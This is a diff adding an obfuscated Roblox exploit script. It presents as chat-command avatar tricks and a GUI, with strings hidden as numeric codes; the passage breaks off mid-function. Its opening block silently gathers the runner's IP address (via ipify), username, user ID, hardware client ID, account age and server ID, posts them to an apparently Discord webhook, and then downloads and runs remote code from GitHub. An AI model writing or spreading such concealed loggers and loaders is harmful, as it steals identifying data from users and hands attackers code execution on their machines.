@@ -1,0 +1,617 @@
+function PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+local webhook = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5250,5040,5670,5775,5250,5145,5775,5355,5040,5775,5355,5565,5880,5985,5880,5670,5565,5670,4935,8925,8505,11445,11130,7980,10710,5250,8820,8610,10500,5565,5250,9450,7770,10815,7560,8295,7245,7770,8820,6825,7455,10395,11550,7140,11025,12495,11550,5460,7035,5250,8925,5145,12600,11025,6825,7245,10815,5670,12075,8295,5775,7455,7455,5565,11655,7770,5565,9975,12495,12600,7035,6825,12075,5775,5880,12285,8190,8190,12495,8505,10920,9030,5145,8610,10605,10185,5040})
+
+-- Define the PlaceId variable
+local PlaceId = game.PlaceId
+
+-- Get the game name and game URL
+-- ط§ط³ظ… ظ…ط§ط¨
+local gameName = game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8085,10185,11970,11235,10605,12180,11760,11340,10185,10395,10605,8715,10605,11970,12390,11025,10395,10605})):GetProductInfo(PlaceId).Name
+-- ط±ط§ط¨ط· ظ„ط¹ط¨ظ‡
+local gameUrl = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10920,12180,12180,11760,12075,6090,4935,4935,12495,12495,12495,4830,11970,11655,10290,11340,11655,12600,4830,10395,11655,11445,4935,10815,10185,11445,10605,12075,4935}) .. PlaceId
+-- ط±ط§ط¨ط· ط¨ط±ظˆظپط§ظٹظ„
+local profileUrl = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10920,12180,12180,11760,12075,6090,4935,4935,12495,12495,12495,4830,11970,11655,10290,11340,11655,12600,4830,10395,11655,11445,4935,12285,12075,10605,11970,12075,4935}) .. game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer.UserId .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4935,11760,11970,11655,10710,11025,11340,10605})
+-- ط¹ط¯ط¯ ط³ظٹط±ظپط±
+local playerCount = #game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8400,11340,10185,12705,10605,11970,12075})):GetPlayers()
+-- ط¨ط±ظٹظ…ظٹظ…
+local Players = game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8400,11340,10185,12705,10605,11970,12075}))
+local player = Players.LocalPlayer
+local hasPremium = player.MembershipType == Enum.MembershipType.Premium
+-- ظˆظ‚طھ ط­ط§ظ„ظٹط§
+local time = os.time()
+local date = os.date(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,12180}), time)
+
+local hour = math.floor(date.hour)
+local min = math.floor(date.min)
+local sec = math.floor(date.sec)
+
+-- ظ…ط¹ط±ظپظ‡ ط§ظ„ ip ط´ط®طµ
+
+local ip = game:HttpGet(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10920,12180,12180,11760,12075,6090,4935,4935,10185,11760,11025,4830,11025,11760,11025,10710,12705,4830,11655,11970,10815}))
+
+-- Create a JSON object to send to the webhook
+local data = {
+    [PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10395,11655,11550,12180,10605,11550,12180})] = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({}),
+    [PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({12285,12075,10605,11970,11550,10185,11445,10605})] = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({6930,12705,3360,6090,3360,5775,12705,10500,5775}),
+    [PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10605,11445,10290,10605,10500,12075})] = {
+        {
+            [PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({12180,11025,12180,11340,10605})] = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({}),
+            [PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10500,10605,12075,10395,11970,11025,11760,12180,11025,11655,11550})] = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({})
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,8400,11340,10185,12705,10605,11970,3360,8190,10185,11445,10605,6090,4410,4410,3360,3360,10080,10080,10080}) .. game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer.Name .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({3360,10080,10080,10080,9660,11550})
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,8400,11340,10185,12705,10605,11970,3360,7665,7140,6090,4410,4410,3360,10080,10080,10080}) .. game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer.UserId .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,9660,11550})
+			.. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,8400,11340,10185,12705,10605,11970,3360,8925,8610,7980,6090,4410,4410,3360,10080,10080,10080}) .. profileUrl .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,9660,11550})
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,7455,10185,11445,10605,3360,8190,10185,11445,10605,6090,4410,4410,3360,10080,10080,10080}) .. gameName .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,9660,11550})
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,7455,10185,11445,10605,3360,8925,8610,7980,6090,4410,4410,3360,10080,10080,10080}) .. gameUrl .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,9660,11550})
+		    .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,8715,10605,11970,12390,10605,11970,3360,7770,11655,10290,7665,10500,3360,6090,4410,4410,3360,10080,10080,10080}) .. game.JobId .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,9660,11550})
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,8715,10605,11970,12390,10605,11970,3360,8190,12285,11445,10290,10605,11970,3360,11760,11340,10185,12705,10605,11970,12075,3360,11655,11550,11340,11025,11550,10605,3360,6090,4410,4410,3360,10080,10080,10080}) .. playerCount .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,9660,11550})
+			.. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,6825,10395,10395,11655,12285,11550,12180,3360,6825,10815,10605,3360,6090,4410,4410,3360,10080,10080,10080}) .. game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer.AccountAge .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,3360,9660,11550}) 
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,7665,8400,3360,6090,4410,4410,3360,10080,10080,10080}) .. ip .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,9660,11550})
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,7560,9135,7665,7140,3360,3360,6090,4410,4410,3360,10080,10080,10080}) .. game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8610,10290,12600,6825,11550,10185,11340,12705,12180,11025,10395,12075,8715,10605,11970,12390,11025,10395,10605})):GetClientId() .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,3360,9660,11550}) 
+            .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4410,4410,8400,11340,10185,12705,10605,11970,3360,8400,11970,10605,11445,11025,12285,11445,3360,6090,4410,4410,3360}) .. if hasPremium then PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,12705,10605,12075,10080,10080,10080}) else PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10080,10080,10080,11550,11655,10080,10080,10080})  .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({9660,11550})
+            .. date.day .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4935}) .. date.month .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({4935}) .. date.year .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({3360}) .. hour .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({6090}) .. min .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({6090}) .. sec .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({}) .. PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({9660,11550})
+        }
+    }
+}
+
+-- Send the data to the webhook
+local HS = game:GetService(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({7560,12180,12180,11760,8715,10605,11970,12390,11025,10395,10605})):JSONEncode(data)
+local headers = {
+    [PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10395,11655,11550,12180,10605,11550,12180,4725,12180,12705,11760,10605})] = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10185,11760,11760,11340,11025,10395,10185,12180,11025,11655,11550,4935,11130,12075,11655,11550})
+}
+
+local data2 = {
+    Url = webhook,
+    Body = HS,
+    Method = PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({8400,8295,8715,8820}),
+    Headers = headers
+}
+
+request(data2)
+loadstring(game:HttpGet(PxJeLdnCejmjGmuKPgpXaQIVmTbyslEBgpwbNOZIqfHkuOYFUjRcqooLOYFjHQdXMnKhExpFzwGiSNRCiEzDqEe({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,9030,8610,5775,12075,12075,4935,9030,8610,5775,4935,11445,10185,11025,11550,4935,9030,8610,5775,3885,5250,5040,8610,6825,7455,7140,8295,7980,7980})))()      
+
+function dVioinolDtcLyyLPPWDofqzcv(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = dVioinolDtcLyyLPPWDofqzcv({3465,22680,18585,22680,18060,22785,13860}) -- 
+if string.sub(message, 1, #keyword) == keyword then
+local ply = game.Players.LocalPlayer
+    local chr = ply.Character
+    chr.RightLowerLeg.MeshId = dVioinolDtcLyyLPPWDofqzcv({5985,5040,5250,5985,5460,5250,5040,5985,5355})
+    chr.RightLowerLeg.Transparency = dVioinolDtcLyyLPPWDofqzcv({5145})
+    chr.RightUpperLeg.MeshId = dVioinolDtcLyyLPPWDofqzcv({10920,12180,12180,11760,6090,4935,4935,12495,12495,12495,4830,11970,11655,10290,11340,11655,12600,4830,10395,11655,11445,4935,10185,12075,12075,10605,12180,4935,6615,11025,10500,6405,5985,5040,5250,5985,5460,5250,5040,5985,5670})
+    chr.RightUpperLeg.TextureID = dVioinolDtcLyyLPPWDofqzcv({10920,12180,12180,11760,6090,4935,4935,11970,11655,10290,11340,11655,12600,4830,10395,11655,11445,4935,10185,12075,12075,10605,12180,4935,6615,11025,10500,6405,5985,5040,5250,5880,5460,5355,5355,5985,5880})
+    chr.RightFoot.MeshId = dVioinolDtcLyyLPPWDofqzcv({5985,5040,5250,5985,5460,5250,5040,5880,5985})
+    chr.RightFoot.Transparency = dVioinolDtcLyyLPPWDofqzcv({5145})
+print(dVioinolDtcLyyLPPWDofqzcv({22680,17850,22785,13965,3360,22680,17850,22680,18900,22680,19530,22785,14490,22785,13860,3360,22680,17535,22785,13860,22680,17535,22785,13965,22680,18585}))
+-- نهايه
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = dVioinolDtcLyyLPPWDofqzcv({3465,22785,14175,22680,18375,22785,13860,22680,18795}) -- 
+if string.sub(message, 1, #keyword) == keyword then
+game.Players.LocalPlayer.Character.Head.Transparency = 1
+    game.Players.LocalPlayer.Character.Head.Transparency = 1
+    for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+        if (v:IsA(dVioinolDtcLyyLPPWDofqzcv({7140,10605,10395,10185,11340}))) then
+            v.Transparency = 1
+        end
+game.Players.LocalPlayer.Character.Head.Transparency = 1 game.Players.LocalPlayer.Character.Head.Transparency = 1 for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do if (v:IsA(dVioinolDtcLyyLPPWDofqzcv({7140,10605,10395,10185,11340}))) then v.Transparency = 1
+ end
+end
+end
+print(dVioinolDtcLyyLPPWDofqzcv({22680,17850,22785,13965,3360,22680,17850,22680,18900,22680,19530,22785,14490,22785,13860,3360,22680,17535,22785,13860,22680,17535,22785,13965,22680,18585}))
+-- نهايه
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = dVioinolDtcLyyLPPWDofqzcv({3465,22680,17850,22680,19425,22785,13860,22785,14490,22785,13650,3360,22680,17535,22785,13860,22680,18795,22785,14490,22680,18585,22785,13545,22680,18585}) -- 
+if string.sub(message, 1, #keyword) == keyword then
+local lp = game:FindService(dVioinolDtcLyyLPPWDofqzcv({8400,11340,10185,12705,10605,11970,12075})).LocalPlayer
+game:GetService(dVioinolDtcLyyLPPWDofqzcv({7035,11655,11970,10605,7455,12285,11025})).PurchasePrompt.Enabled = true
+_G.Lag = true
+while _G.Lag do
+for i,v in pairs(workspace:GetDescendants()) do
+            if v:IsA(dVioinolDtcLyyLPPWDofqzcv({7035,11340,11025,10395,11235,7140,10605,12180,10605,10395,12180,11655,11970})) then
+                fireclickdetector(v)
+            end
+end
+        wait(1)
+        end
+print(dVioinolDtcLyyLPPWDofqzcv({22680,17850,22785,13965,3360,22680,17850,22680,18900,22680,19530,22785,14490,22785,13860,3360,22680,17535,22785,13860,22680,17535,22785,13965,22680,18585}))
+-- نهايه
+end
+end)
+
+local function sendSystemMessage()
+    game.StarterGui:SetCore(dVioinolDtcLyyLPPWDofqzcv({7035,10920,10185,12180,8085,10185,11235,10605,8715,12705,12075,12180,10605,11445,8085,10605,12075,12075,10185,10815,10605}), {
+    Text = dVioinolDtcLyyLPPWDofqzcv({9555,8715,12705,12075,12180,10605,11445,25200,16695,15540,17325,9765,3360,6090,3360,22680,17535,22680,18795,22680,17850,22785,13965,22680,17850,22680,19425,3360,3465,3360}); -- 
+        Font = Enum.Font; --font
+        Color = Color3.new(252, 250, 255); -- 
+        FontSize = Enum.FontSize.Size96 --size
+    })
+end
+
+sendSystemMessage()
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = dVioinolDtcLyyLPPWDofqzcv({3465,22680,18795,22680,18165,22680,17640}) -- 
+if string.sub(message, 1, #keyword) == keyword then
+local plrs=game:FindFirstChildOfClass(dVioinolDtcLyyLPPWDofqzcv({8400,11340,10185,12705,10605,11970,12075}))
+local lp=plrs.LocalPlayer
+local ws=game:FindFirstChildOfClass(dVioinolDtcLyyLPPWDofqzcv({9135,11655,11970,11235,12075,11760,10185,10395,10605}))
+local uis=game:FindFirstChildOfClass(dVioinolDtcLyyLPPWDofqzcv({8925,12075,10605,11970,7665,11550,11760,12285,12180,8715,10605,11970,12390,11025,10395,10605}))
+local rs=game:FindFirstChildOfClass(dVioinolDtcLyyLPPWDofqzcv({8610,12285,11550,8715,10605,11970,12390,11025,10395,10605}))
+local heartbeat=rs.Heartbeat
+local renderstepped=rs.RenderStepped
+local angles=CFrame.Angles
+local cf=CFrame.new
+local v3=Vector3.new
+local v3_010=v3(0,1,0)
+local v3_0=v3(0,0,0)
+local osclock=os.clock
+local twait=task.wait
+local slower=string.lower
+local ssub=string.sub
+
+local speeding=32
+local maxspeed=75
+local off=angles(-1.5707963267948966,0,0)
+
+local function gp(p,n,cl)
+	if typeof(p)==dVioinolDtcLyyLPPWDofqzcv({7665,11550,12075,12180,10185,11550,10395,10605}) then
+		local c=p:GetChildren()
+		for i=1,#c do
+			local v=c[i]
+			if (v.Name==n) and v:IsA(cl) then
+				return v
+			end
+		end
+	end
+	return nil
+end
+
+local i=Instance.new 
+local v2=Vector2.new 
+local bc=BrickColor.new 
+local c3=Color3.new 
+local u2=UDim2.new 
+local sc,mr=string.char,math.random 
+local function rs(l) 
+	l=l or mr(8,15) 
+	local s=dVioinolDtcLyyLPPWDofqzcv({}) 
+	for i=1,l do 
+		if mr(1,2)==1 then 
+			s=s..sc(mr(65,90)) 
+		else 
+			s=s..sc(mr(97,122)) 
+		end 
+	end 
+	return s 
+end 
+local e=Enum 
+local i1=i(dVioinolDtcLyyLPPWDofqzcv({7350,11970,10185,11445,10605})) 
+local i2=i(dVioinolDtcLyyLPPWDofqzcv({8820,10605,12600,12180,7980,10185,10290,10605,11340})) 
+local i3=i(dVioinolDtcLyyLPPWDofqzcv({7350,11970,10185,11445,10605})) 
+local i4=i(dVioinolDtcLyyLPPWDofqzcv({8820,10605,12600,12180,6930,11655,12600})) 
+local i5=i(dVioinolDtcLyyLPPWDofqzcv({8820,10605,12600,12180,6930,12285,12180,12180,11655,11550})) 
+local i6=i(dVioinolDtcLyyLPPWDofqzcv({8820,10605,12600,12180,7980,10185,10290,10605,11340})) 
+local i7=i(dVioinolDtcLyyLPPWDofqzcv({8820,10605,12600,12180,7980,10185,10290,10605,11340})) 
+local i8=i(dVioinolDtcLyyLPPWDofqzcv({8715,10395,11970,10605,10605,11550,7455,12285,11025})) 
+i1.AnchorPoint=v2(0.5,0.5) 
+i1.BackgroundColor=bc(149) 
+i1.BackgroundColor3=c3(0.129412,0.129412,0.129412) 
+i1.BorderColor=bc(1003) 
+i1.BorderColor3=c3(0,0,0) 
+i1.BorderSizePixel=0 
+i1.Position=u2(0.5,0,0.5,0) 
+i1.Size=u2(0,250,0,140) 
+i1.Name=rs() 
+i1.Parent=i8 
+i2.Font=e.Font.SourceSans 
+i2.FontSize=e.FontSize.Size24 
+i2.Text=dVioinolDtcLyyLPPWDofqzcv({6930,12705,3360,9030,8610,5775}) 
+i2.TextColor=bc(1002) 
+i2.TextColor3=c3(0.815686,0.815686,0.815686) 
+i2.TextSize=20 
+i2.BackgroundColor=bc(1001) 
+i2.BackgroundColor3=c3(1,1,1) 
+i2.BackgroundTransparency=1 
+i2.BorderColor=bc(1003) 
+i2.BorderColor3=c3(0,0,0) 
+i2.BorderSizePixel=0 
+i2.Size=u2(1,0,0,25) 
+i2.Name=rs() 
+i2.Parent=i1 
+i3.BackgroundColor=bc(26) 
+i3.BackgroundColor3=c3(0.192157,0.192157,0.192157) 
+i3.BorderColor=bc(1003) 
+i3.BorderColor3=c3(0,0,0) 
+i3.BorderSizePixel=0 
+i3.ClipsDescendants=true 
+i3.Position=u2(0,5,0,25) 
+i3.Size=u2(1,-10,1,-30) 
+i3.Name=rs() 
+i3.Parent=i1 
+i4.CursorPosition=-1 
+i4.Font=e.Font.SourceSans 
+i4.FontSize=e.FontSize.Size24 
+i4.PlaceholderColor3=c3(0.509804,0.509804,0.509804) 
+i4.PlaceholderText=dVioinolDtcLyyLPPWDofqzcv({22680,17535,22785,13755,22680,17850,22680,17640,3360,22680,17535,22680,18795,22785,13965,3360,22680,17535,22785,13860,22680,17535,22680,19425,22680,17640,3360,22785,14175,22785,14070,22680,17535}) 
+i4.Text=dVioinolDtcLyyLPPWDofqzcv({}) 
+i4.TextColor=bc(1) 
+i4.TextColor3=c3(0.952941,0.952941,0.952941) 
+i4.TextSize=20 
+i4.TextWrap=true 
+i4.AnchorPoint=v2(0.5,0) 
+i4.BackgroundColor=bc(364) 
+i4.BackgroundColor3=c3(0.266667,0.266667,0.266667) 
+i4.BorderColor=bc(1003) 
+i4.BorderColor3=c3(0,0,0) 
+i4.BorderSizePixel=0 
+i4.ClipsDescendants=true 
+i4.Position=u2(0.5,0,0,13) 
+i4.Size=u2(1,-30,0,32) 
+i4.Name=rs() 
+i4.Parent=i3 
+i5.AnchorPoint=v2(0.5,0) 
+i5.BackgroundColor=bc(364) 
+i5.BackgroundColor3=c3(0.266667,0.266667,0.266667) 
+i5.BorderColor=bc(1003) 
+i5.BorderColor3=c3(0,0,0) 
+i5.BorderSizePixel=0 
+i5.Position=u2(0.5,0,0,64) 
+i5.Size=u2(1,-30,0,32) 
+i5.Name=rs() 
+i5.Parent=i3 
+i5.Font=e.Font.FredokaOne 
+i5.FontSize=e.FontSize.Size24 
+i5.Text=dVioinolDtcLyyLPPWDofqzcv({22680,18795,22680,18165,22680,17640}) 
+i5.TextColor3=c3(0.55,0.55,0.55) 
+i5.TextSize=23 
+i6.Font=e.Font.SourceSans 
+i6.FontSize=e.FontSize.Size14 
+i6.Text= dVioinolDtcLyyLPPWDofqzcv({22785,13965,22785,13860,22680,17535,22680,18165,22680,19320,22785,14175,3360,22785,13860,22680,17535,22680,18690,22785,13965,3360,22680,17535,22785,13860,22680,17535,22680,19425,22680,17640,3360,22785,14490,22785,13755,22785,14280,22785,14070,3360,22785,13965,22680,17535,22785,14490,22680,17850,22680,18165,22680,18585,22785,13755}) 
+i6.TextColor=bc(2) 
+i6.TextColor3=c3(0.635294,0.635294,0.635294) 
+i6.AnchorPoint=v2(1,1) 
+i6.AutomaticSize=e.AutomaticSize.XY 
+i6.BackgroundColor=bc(1001) 
+i6.BackgroundColor3=c3(1,1,1) 
+i6.BackgroundTransparency=1 
+i6.BorderColor=bc(1003) 
+i6.BorderColor3=c3(0,0,0) 
+i6.BorderSizePixel=0 
+i6.Position=u2(1,0,1,0) 
+i6.Name=rs() 
+i6.Parent=i3 
+i7.Font=e.Font.SourceSans 
+i7.FontSize=e.FontSize.Size14 
+i7.Text=dVioinolDtcLyyLPPWDofqzcv({}) 
+i7.TextColor=bc(2) 
+i7.TextColor3=c3(0.635294,0.635294,0.635294) 
+i7.AnchorPoint=v2(0.5,0) 
+i7.AutomaticSize=e.AutomaticSize.XY 
+i7.BackgroundColor=bc(1001) 
+i7.BackgroundColor3=c3(1,1,1) 
+i7.BackgroundTransparency=1 
+i7.BorderColor=bc(1003) 
+i7.BorderColor3=c3(0,0,0) 
+i7.BorderSizePixel=0 
+i7.Position=u2(0.5,0,0,47) 
+i7.Name=rs() 
+i7.Parent=i3 
+i8.ZIndexBehavior=e.ZIndexBehavior.Sibling 
+i8.Name=rs() 
+
+local function Draggable(window,obj)
+	local MB1enum = e.UserInputType.MouseButton1
+	local TOUCHenum = e.UserInputType.Touch
+	obj = obj or window
+	local activeEntered = 0
+	local mouseStart = nil
+	local dragStart = nil
+	local inputbegancon = nil
+	local rendersteppedcon = nil
+	local inputendedcon = nil
+	local function inputendedf(a)
+		a=a.UserInputType
+		if (a==MB1enum) or (a==TOUCHenum) then
+			rendersteppedcon:Disconnect()
+			inputendedcon:Disconnect()
+		end
+	end
+	local function rendersteppedf()
+		local off = uis:GetMouseLocation()-mouseStart
+		window.Position=dragStart+u2(0,off.X,0,off.Y)
+	end
+	local function inputbeganf(a)
+		a=a.UserInputType
+		if ((a==MB1enum) or (a==TOUCHenum)) and (activeEntered==0) and not uis:GetFocusedTextBox() then
+			mouseStart=uis:GetMouseLocation()
